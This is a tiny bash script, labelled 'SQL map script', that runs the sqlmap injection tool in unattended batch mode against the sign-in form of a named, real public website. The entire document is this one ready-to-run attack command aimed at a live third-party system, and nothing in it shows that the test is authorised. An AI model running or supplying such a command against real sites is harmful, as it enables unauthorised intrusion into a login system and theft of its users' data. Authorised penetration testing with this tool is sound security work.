#!/bin/bash
# SQL map script


sqlmap -u 'https://www.cyclestreets.net/signin/' --batch --forms --dbms=MySQL
